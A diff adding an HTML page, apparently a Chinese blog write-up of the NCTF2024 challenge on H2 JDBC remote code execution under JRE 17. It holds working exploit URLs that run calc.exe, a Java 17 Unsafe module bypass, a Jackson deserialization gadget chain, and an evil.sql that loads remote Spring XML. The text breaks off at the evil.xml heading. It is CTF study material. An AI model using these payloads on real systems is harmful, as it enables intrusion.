@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>JRE 17环境下的H2 Rce学习 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 七月 22日 2025, 4:29 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    3.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      16 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>放暑假了，来学习一下知识充充电。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>计划从一道CTF题目来学习，题目地址：<a href="https://github.com/X1cT34m/NCTF2024">https://github.com/X1cT34m/NCTF2024</a></p>
+<p>下载得到题目环境后可以使用docker启动。</p>
+<h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p><a href="https://aluvion.github.io/2021/12/27/h2-jdbc-%E6%94%BB%E5%87%BB/">以前简单学习过一下</a>，当时学习过的简单来说就是在JDBC驱动和连接所用URL可控的情况下发起连接会导致RCE。</p>
+<p>攻击payload触发环境类似：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">DRIVER_CLASS</span> <span class="operator">=</span> <span class="string">&quot;org.h2.Driver&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;cmd /c calc.exe&#x27;)\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;$$\n&quot;</span>;;</span><br><span class="line"><span class="type">Properties</span> <span class="variable">info</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(DRIVER_CLASS);</span><br><span class="line">    DriverManager.getDriver(JDBC_URL).connect(JDBC_URL, info);</span><br><span class="line">&#125;<span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>H2 RCE, 在Java8的环境下，常规思路是利用CREATE ALIAS创建Java函数或者是利用JavaScript引擎执行Runtime.exec等函数实现RCE。</p>
+<h4 id="通过JavaScript引擎"><a href="#通过JavaScript引擎" class="headerlink" title="通过JavaScript引擎"></a>通过JavaScript引擎</h4><p>依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.30.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.224<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>触发RCE：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;org.h2.Driver&quot;</span>);</span><br><span class="line">        DriverManager.getConnection(javaScript());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">javaScript</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;cmd /c calc.exe&#x27;)\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过创建Java函数"><a href="#通过创建Java函数" class="headerlink" title="通过创建Java函数"></a>通过创建Java函数</h4><p>在Java8环境下触发RCE：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cmd&quot;</span>);</span><br><span class="line">ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;cmd /c calc.exe\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> java.util.Base64.getEncoder().encodeToString(ctClass.toBytecode());</span><br><span class="line"><span class="type">String</span> <span class="variable">url0</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER H2RCE BEFORE SELECT ON &quot;</span> +</span><br><span class="line">        <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$void SHELL3() throws Exception&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;byte[] bytes=java.util.Base64.getDecoder().decode(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;defineClass\&quot;, byte[].class, int.class, int.class)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;defineClassMethod.setAccessible(true)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(&quot;</span> +</span><br><span class="line">        <span class="string">&quot;new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0, bytes.length)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;clz.newInstance()\\;&#125;$$&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在Java17环境下，反射受到了module的限制，需要使用Unsafe绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER H2RCE BEFORE SELECT ON &quot;</span> +</span><br><span class="line">        <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$void SHELL3() throws Exception&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;byte[] bytes\\;Class unsafeClass = Class.forName(\&quot;sun.misc.Unsafe\&quot;)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;java.lang.reflect.Field field = unsafeClass.getDeclaredField(\&quot;theUnsafe\&quot;)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;field.setAccessible(true)\\;sun.misc.Unsafe unsafe = (sun.misc.Unsafe)field.get(null)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Module module = Object.class.getModule()\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\&quot;module\&quot;))\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;unsafe.putObject(H2RCE.class, offset, module)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;bytes=java.util.Base64.getDecoder().decode(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;defineClass\&quot;, byte[].class, int.class, int.class)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;defineClassMethod.setAccessible(true)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0, bytes.length)\\;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;clz.newInstance()\\;&#125;$$&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当然，Java8下面没有getModule这种module专用的函数，所以java17的payload也无法在java8下面使用。</p>
+<h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><p>根据参考文章，该题目环境下对这两种利用方式进行了限制：</p>
+<ul>
+<li>从 Java 15 版本开始， JavaScript 引擎 (Nashorn) 已经被删除</li>
+<li>题目给的是 JRE 17 而不是 JDK 17, 不存在 javac 命令, 无法编译 Java 代码, 也就是说无法像常规思路那样通过 CREATE ALIAS 创建 Java 函数</li>
+</ul>
+<h3 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h3><p>有点好奇题目的开发和部署方式，遂阅读一下题目源码，docker是直接使用的JRE镜像所以没有JDK环境，首先是MANIFEST.MF的入口配置：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Main-Class:</span> <span class="string">org.springframework.boot.loader.launch.JarLauncher</span></span><br><span class="line"><span class="attr">Start-Class:</span> <span class="string">challenge.H2RevengeApplication</span></span><br></pre></td></tr></table></figure>
+
+<p>以Jar的方式启动SpringBoot，然后在IndexController中接受数据并反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/deserialize&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] buffer = Base64.getDecoder().decode(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(buffer))) &#123;</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个MyDataSource类，其getConnection函数可以触发JDBC连接，进而触发H2 RCE：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDataSource</span> <span class="keyword">implements</span> <span class="title class_">DataSource</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyDataSource</span><span class="params">(String url, String username, String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(<span class="built_in">this</span>.url, <span class="built_in">this</span>.username, <span class="built_in">this</span>.password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(<span class="built_in">this</span>.url, username, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="环境限制下的H2-RCE"><a href="#环境限制下的H2-RCE" class="headerlink" title="环境限制下的H2 RCE"></a>环境限制下的H2 RCE</h3><h4 id="触发JDBC"><a href="#触发JDBC" class="headerlink" title="触发JDBC"></a>触发JDBC</h4><p>由于最后的sink是个getter，所以还需要想想办法通过反序列化触发getter，或者是触发DataSource.getConnection函数的路径。</p>
+<p>翻一下文件夹，在项目的lib文件夹中发现了jackson 2.18.2的依赖，通过调用jackson的POJONode类的toString函数就可以实现反序列化 + getter。</p>
+<p>先添加一个jackson依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.18.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再把MyDataSource复制一份到我们的测试环境里，准备开始写序列化。</p>
+<p>在我的测试环境Java 21中，BadAttributeValueExpException类已经发生了变化，无法再作为toString函数的触发器了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String || valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = (String)valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用XString或者EventListenerList来替代，这里先尝试使用参考文章给出的EventListenerList类，其反序列化函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Serial</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    listenerList = NULL_ARRAY;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    Object listenerTypeOrNull;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">null</span> != (listenerTypeOrNull = s.readObject())) &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">EventListener</span> <span class="variable">l</span> <span class="operator">=</span> (EventListener)s.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) listenerTypeOrNull;</span><br><span class="line">        ReflectUtil.checkPackageAccess(name);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Class&lt;EventListener&gt; tmp = (Class&lt;EventListener&gt;)Class.forName(name, <span class="literal">true</span>, cl);</span><br><span class="line">        add(tmp, l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Class&lt;T&gt; t, T l)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (l==<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!t.isInstance(l)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Listener &quot;</span> + l +</span><br><span class="line">                                        <span class="string">&quot; is not of type &quot;</span> + t);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意到add函数存在隐式触发toString函数的字符串拼接操作，但是这里的对象 l 在readObject函数中将类型显式定义为了EventListener，所以要走到POJONode类的toString函数，还需要一个跳板。</p>
+<p>找到UndoManager类，它继承自UndoableEditListener-EventListener，而且toString函数也符合要求：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.toString()</span><br><span class="line">        + <span class="string">&quot; inProgress: &quot;</span> + inProgress</span><br><span class="line">        + <span class="string">&quot; edits: &quot;</span> + edits;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为高版本Java的module限制问题，还需要使用Unsafe修改一下序列化数据生成类的module。</p>
+<p>因为POJONode继承了writeReplace函数，所以序列化出来的总是ObjectNode，反序列化时就无法触发getter，而且序列化时会触发getter导致connect failed的错误，根据参考文章，可能配置好Web服务器提供SQL文件和XML文件之后会好。</p>
+<p>先试一下，开个Tomcat然后将这两个文件放上去：</p>
+<p>evil.sql：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="keyword">FOR</span> <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="keyword">FOR</span> <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="keyword">FOR</span> <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_str</span><span class="operator">=</span><span class="string">&#x27;http://127.0.0.1:8080/evil.xml&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_obj</span><span class="operator">=</span>UNESCAPE_VALUE(<span class="variable">@url_str</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@context_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@string_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> NEW_INSTANCE(<span class="variable">@context_clazz</span>, <span class="keyword">ARRAY</span>[<span class="variable">@string_clazz</span>], <span class="keyword">ARRAY</span>[<span class="variable">@url_obj</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>evil.xml：</p>
